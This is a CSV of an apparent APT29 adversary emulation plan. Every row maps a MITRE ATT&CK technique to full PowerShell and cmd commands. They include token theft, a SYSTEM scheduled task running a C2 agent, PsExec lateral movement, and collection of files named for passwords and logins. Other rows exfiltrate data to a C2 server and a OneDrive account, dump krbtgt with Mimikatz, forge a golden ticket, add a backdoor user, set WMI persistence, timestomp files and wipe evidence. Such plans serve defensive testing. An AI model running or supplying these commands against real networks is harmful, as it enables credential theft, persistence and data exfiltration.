source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
apt29,apt29,APT29,7,45,9b518cfb-125f-466e-872b-4f8171773ce5,7.B.2,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Remote File Copy (T1105),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;"
apt29,apt29,APT29,7,46,6b90da47-13d0-48fc-8f07-0a1e6d5d876e,7.C.1,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Scheduled Tasks (T1053),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;"
apt29,apt29,APT29,8,47,95564347-e77a-4a89-b08f-dcafa5468f2c,8.A.1,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Remote System Discovery (T1018),Custom PowerShell script to perform AD triage for domain bound computers.,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Ad-Search Computer Name *;"
apt29,apt29,APT29,8,48,c4a59e39-53b0-4ace-9528-8ff052752ece,8.A.2,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Identifying current user on other machines,Custom PowerShell script to perform AD triage for domain bound computers.,"Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Sele...","Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;"
apt29,apt29,APT29,8,49,9fefcde6-083a-4440-8eca-dc03d30c0bcb,8.A.3,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,File and Directory Discovery (T1083),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;"
apt29,apt29,APT29,8,50,bddc0abc-07a0-41b7-813f-e0c64d9226b3,8.B,lateral-movement,T1105,Ingress Tool Transfer,Copy Sandcat File,Copy Sandcat file using PsExec,"move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force; set-location ""C:\Program Files\SysinternalsSuite\""; .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows...","move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
set-location ""C:\Program Files\SysinternalsSuite\"";
.\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows\Temp\python.exe"" -group ""day-1-lateral-movement"" -server ""#{server}"";
tasklist /S #{pivot_machine_hostname} /FI ""IMAGENAME eq python.exe"";"
apt29,apt29,APT29,8,51,0b1841bd-ef8b-475c-bce7-8fcb2860984a,8.D.1,collection,T1113,Screen Capture,Screen Capture (T1113),Native API call(s) were used to collect a screenshot.,Import-Module .\Get-Screenshot.ps1 -Verbose -Force; Get-Screenshot;,"Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
Get-Screenshot;"
apt29,apt29,APT29,9,52,d5170a60-3bdc-44e0-9870-a38db5c0cf81,9.A.1,discovery,T1083,File and Directory Discovery,File and Directory Discovery (T1083),PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.,ls #{remote.file.share},ls #{remote.file.share}
apt29,apt29,APT29,9,53,08e57385-dbce-4850-8bb7-589ef79465ab,9.B.1,execution,T1059.001,Command and Scripting Interpreter: PowerShell,Automated document collection (T1119),Execute PowerShell collection command to collect and compress files of specific extensions.,"move-item Rar.exe -Destination C:\Windows\Temp -Force; $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*....","move-item Rar.exe -Destination C:\Windows\Temp -Force;
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
cd C:\Windows\Temp;
.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";"
apt29,apt29,APT29,9,54,2d18c8ec-4593-49dc-9bf4-11d0673d6ae6,9.B.8,exfiltration,T1041,Exfiltration Over C2 Channel,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),Copy a target file from a remote file share through the existing C2 channel,"Import-Module .\upload.ps1 -Verbose -Force; Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";","Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";"
apt29,apt29,APT29,9,55,208b021b-c79a-4176-8ad1-3af99ed50c6f,9.C,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup - Delete Staged Files,Cleanup files related to Operation,"if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) { mkdir ""C:\Program Files\SysInternalsSuite""; } set-location ""C:\Program Files\SysInternalsSuite""; if (!$(test-path -path ""sdelete64.exe"")) { iwr -uri ""htt...","if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  mkdir ""C:\Program Files\SysInternalsSuite"";
}
set-location ""C:\Program Files\SysInternalsSuite"";

if (!$(test-path -path ""sdelete64.exe"")) {
  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
  Expand-Archive sdelete64.zip -force;
}
copy sdelete64.exe C:\Windows\Temp\;
cd C:\Windows\Temp\ ;
.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
remove-item C:\Windows\Temp\sdelete64.exe -force;"
apt29,apt29,APT29,10,56,4b2e9574-b1a7-4b38-95b2-6054ded9c4fe,10.A.2,impact,T1529,System Shutdown/Reboot,Scheduled Task,Reboot the machine to aid in peristence callbacks,"write-host ""[*] Restarting Computer""; Restart-Computer -Force;","write-host ""[*] Restarting Computer"";
Restart-Computer -Force;"
apt29,apt29,APT29,10,57,4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92,10.A.3,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup,Delete file artifacts left from the operation.,"Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force; Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force; Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force; if (test-path -path ""$env:APPDATA\...","Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
} else {
    write-host ""[!] File did not exist to be removed!"";
}

if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Keystrokes"";
    if ($?) {
        write-host ""[+] Job \""Keystrokes\"" was remove."";
    }
} else {
    write-host ""[!] Job \""Keystrokes\"" did not exist."";
}

if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Screenshot"" -Force;
    write-host ""[+] Job \""screenshot\"" was removed."";
} else {
    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
}
remove-item upload.ps1 -Force;"
apt29,apt29,APT29,10,58,00446217-53ca-4749-bacd-f41fe189d36e,10.B,lateral-movement,T1037.005,Boot or Logon Initialization Scripts: Startup Items,Startup Folder Persistence Execution,Sets credentials for a headless RDP session to spawn triggering startup folder persistence.,cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password}; mstsc /v:127.0.0.2; sleep 10; Get-Process -name mstsc; if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;},"cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
mstsc /v:127.0.0.2;
sleep 10;
Get-Process -name mstsc;
if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}"
apt29,apt29,APT29,11,59,e506f811-884d-4992-aacb-514b33a0324f,11.A,execution,T1204.002,User Execution: Malicious File,Click .LNK payload,Execute PowerShell collection command to collect and compress files of specific extensions.,"Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop""; if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){ Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force; Write-Host ""Removed old kxwn.lock file""...","Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";

if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
  Write-Host ""Removed old kxwn.lock file"";
}

powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;"
apt29,apt29,APT29,12,60,4a2ad84e-a93a-4b2e-b1f0-c354d6a41278,12.A,defensive-evasion,T1070.006,Indicator Removal on Host: Timestomp,Timestomp kxwn.lock,Timestomp kxwn.lock,"if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) { write-host ""[!] kxwn.lock was not found on this host.""; exit 1; } else { . .\timestomp.ps1; timestomp -dest ""$env:appdata\Microsoft\kxwn.lock""; }","if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
  write-host ""[!] kxwn.lock was not found on this host."";
  exit 1;
} else {
  . .\timestomp.ps1;
  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
}"
apt29,apt29,APT29,12,61,f9c0b150-822f-497b-ad6d-187f24561e9a,12.B,discovery,T1518.001,Software Discovery: Security Software Discovery,Detect Anti-Virus,Detect anti-virus software on host,. .\stepTwelve.ps1; detectav,". .\stepTwelve.ps1;
detectav"
apt29,apt29,APT29,12,62,2b5a72b1-01e4-48ae-98b0-2570a7894371,12.C,discovery,T1518,Software Discovery,Detect Software,Detect software on host,. .\stepTwelve.ps1; software;,". .\stepTwelve.ps1;
software;"
apt29,apt29,APT29,13,63,0cfadbcb-ec21-44ae-adb7-9a23176dd620,13.A,discovery,T1082,System Information Discovery,Enumerate Computer Name,"Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie",. .\stepThirteen.ps1; comp;,". .\stepThirteen.ps1;
comp;"
apt29,apt29,APT29,13,64,96140694-6d13-40b6-9553-0e63533469f3,13.B,discovery,T1082,System Information Discovery,Enumerate Domain Name,Domain triage,. .\stepThirteen.ps1; domain;,". .\stepThirteen.ps1;
domain;"
apt29,apt29,APT29,13,65,f320eebd-e75b-4194-b529-79e64ad0b9ee,13.C,discovery,T1033,System Owner/User Discovery,Enumerate Username,user triage,. .\stepThirteen.ps1; user;,". .\stepThirteen.ps1;
user;"
apt29,apt29,APT29,13,66,a34ab8f2-a106-41fb-af0b-cf5382bd18ae,13.D,discovery,T1057,Process Discovery,Enumerate Processes,Process triage,. .\stepThirteen.ps1; pslist;,". .\stepThirteen.ps1;
pslist;"
apt29,apt29,APT29,14,67,5226e5dc-fc28-43b7-a679-0db49d520402,14.A,defensive-evasion,T1134.002,Access Token Manipulation: Create Process with Token,UAC Bypass via sdctl,Invoke UAC bypass sdctl,. .\stepFourteen_bypassUAC.ps1; bypass;,". .\stepFourteen_bypassUAC.ps1;
bypass;"
apt29,apt29,APT29,14,68,4ef6009d-2d62-4bb4-8de9-0458df2e9567,14.B,credential-access,T1003,Credential Dumping,Credential Dumping,Dumping credentials via wmidump (Mimikatz),. .\stepFourteen_credDump.ps1;,. .\stepFourteen_credDump.ps1;
apt29,apt29,APT29,14,69,1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24,14.C,credential-access,T1003,Credential Dumping,Stage Mimikatz Binary,Staging Mimikatz Binary for later execution,"write-host ""[+] Successfully downloaded m.exe"";","write-host ""[+] Successfully downloaded m.exe"";"
apt29,apt29,APT29,15,70,43aad2d6-d16a-4adb-aa2b-9510a3be4c52,15.A,persistence,T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,WMI Persistence technique,user triage,"Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter""; if ($?) { write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script.""; exit 1; } else { . .\stepF...","Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
if ($?) {
  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host ""[+] WMI script has successfully executed!"";
    exit 0;
  }
  exit 1;
}"
apt29,apt29,APT29,16,71,1c8552c7-f7ed-4523-b640-72d65af5f855,16.A,discovery,T1018,Remote System Discovery,Enumerate Domain Controller,Get domain controller and current user SID for the domain,. .\powerview.ps1; get-netdomaincontroller;,". .\powerview.ps1;
get-netdomaincontroller;"
apt29,apt29,APT29,16,72,a42be479-fc26-4d7c-9e63-7a9b74e4c8d2,16.B,discovery,T1033,System Owner/User Discovery,Enumerate Domain SID,Get domain user SID,. .\stepSixteen_SID.ps1; siduser;,". .\stepSixteen_SID.ps1;
siduser;"
apt29,apt29,APT29,16,73,acecc8f7-18c2-41fd-87bc-39ffd644e4e9,16.C,lateral-movement,T1105,Ingress Tool Transfer,Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping,Establish connection to Domain Controller,". .\invoke-winrmsession.ps1; $session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}""; Copy-Item m.exe -Destination ""C:\Windows\...",". .\invoke-winrmsession.ps1;
$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
if ($?) {
  write-host ""[+] Successfully copied m.exe to remote host"";
} else {
  write-host ""[!] Error, copying and executing m.exe on remote host"";
}
Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string"
apt29,apt29,APT29,17,74,b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c,17.A,collection,T1114.001,Email Collection: Local Email Collection,Collect E-mails,Perform e-mail collection from custom PowerShell module.,". .\stepSeventeen_email.ps1; Write-Host ""Emails Collected"";",". .\stepSeventeen_email.ps1;
Write-Host ""Emails Collected"";"
apt29,apt29,APT29,17,75,fc231955-774f-442c-ac0e-e74dfda50c5c,17.B,collection,T1005,Data from Local System,Collect Files & Compress Collection,Collect a specific document from a target machine.,"try{ if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) { New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force; } } catch { wr...","try{
  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
  }
} catch {
  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
  exit 1;
}

if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
  exit 1;
}
Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
. .\stepSeventeen_zip.ps1;
zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
if ($?) {
  write-host ""[+] Documents successfully staged for collection."";
}"
apt29,apt29,APT29,18,76,4840d6dd-da13-401a-be46-05db56f4e1e0,18.A,exfiltration,T1537,Transfer Data to Cloud Account,Exfiltrate data to OneDrive,Transfer data to a OneDrive account,"$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1); if($err -Like ""*System error 85*"") { Write-Host ""OneDrive net drive is already mounted!""; } elseif($err -Like ""*System error...","$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
if($err -Like ""*System error 85*"") {
  Write-Host ""OneDrive net drive is already mounted!"";
} elseif($err -Like ""*System error 67*"") {
  Write-Host ""OneDrive net drive mount failed - Check URL!"";
  Write-Host ""#{onedrive.url}"";
  exit 1;
} elseif($err -Like ""*System error 1244*"") {
  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
  Write-Host ""User: #{onedrive.username}"";
  Write-Host ""Password: #{onedrive.password}"";
  exit 1;
}

Write-Host ""Mount Successful""
Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
if(!$?){
  exit 1;
}

Write-Host ""Copy Successfull""
exit 0;"
apt29,apt29,APT29,19,77,f820b93d-6176-4a72-a138-a70b0b549c49,19.A,impact,T1561.001,Disk Wipe: Disk Content Wipe,Data Wiping of staged files,Securely delete previously staged files.,". .\wipe.ps1; wipe ""m.exe""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";",". .\wipe.ps1;
wipe ""m.exe"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";"
apt29,apt29,APT29,20,78,267bad86-3f06-49f1-9a3e-6522f2a61e7a,20.A.1,credential-access,T1003,Credential Dumping,Execute Invoke-Mimikatz,Perfofrm Mimikatz credential collection,"klist purge; . .\Invoke-Mimikatz.ps1; invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid} /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt""; klist; invoke-command -Comput...","klist purge;
. .\Invoke-Mimikatz.ps1;
invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
klist;
invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};"
apt29,apt29,APT29,20,79,afb8d8f7-d059-4825-95ae-c5727e2db320,20.B,persistence,T1218.011,Signed Binary Proxy Execution: Rundll32,Triggering Persistent,Trigger RegKey persistence by rebooting the machine,Restart-Computer -Force;,Restart-Computer -Force;
